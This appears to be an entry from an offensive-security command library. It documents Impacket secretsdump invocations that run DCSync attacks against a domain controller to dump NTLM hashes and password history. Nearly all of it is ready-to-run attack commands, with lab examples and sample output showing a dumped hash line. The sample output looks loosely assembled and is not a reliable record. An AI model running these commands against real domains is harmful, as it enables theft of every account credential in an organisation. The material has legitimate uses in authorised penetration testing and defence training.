---
id: 5e7ebfd2-ff07-4fc7-a1dd-50a28253c24e
name: secretsdump-extract-ntlm-hashes
type: command
executor: bash
data: >-
  python secretsdump.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_DC_IP -just-dc-ntlm

  python secretsdump.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_DC_IP -ntds $_NTDS_FILE
  -history -just-dc
output: null
created_at: '2023-04-06T03:56:08.022970+00:00'
updated_at: '2023-04-10T20:26:32.381858+00:00'
platforms:
  - Linux
tags:
  - credential-access
  - dcsync
verified: true
validated: true
---

# secretsdump-extract-ntlm-hashes

## Command

```bash
python secretsdump.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_DC_IP -just-dc-ntlm
python secretsdump.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_DC_IP -ntds $_NTDS_FILE -history -just-dc
```

## Description

Uses Impacket's secretsdump to perform DCSync attacks and extract NTLM hashes from a domain controller, optionally including password history from an NTDS.dit file.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN/$_USERNAME:$_PASSWORD@$_DC_IP | Credentials and target DC (e.g., domain/user:pass@10.0.0.1) | Yes |
| -just-dc-ntlm | Extract only NTLM hashes from DC | No |
| -ntds $_NTDS_FILE | Path to NTDS.dit file | No |
| -history | Include password history | No |

## Examples

### Basic Usage

```bash
python secretsdump.py lab/admin:pass@192.168.0.2 -just-dc-ntlm
```

### Advanced Usage

```bash
python secretsdump.py lab/admin:pass@192.168.0.2 -ntds ntds.dit -history -just-dc
```

## Expected Output

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

ServiceInstall: DISP
[*] Target system \192.168.0.2 is running Windows Server 2016
[*] Dumping DOMAIN\krbtgt NTLM hash...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

## Related

- [[procedures/PrivExchange-Attack-with-NTLM-Relay]]
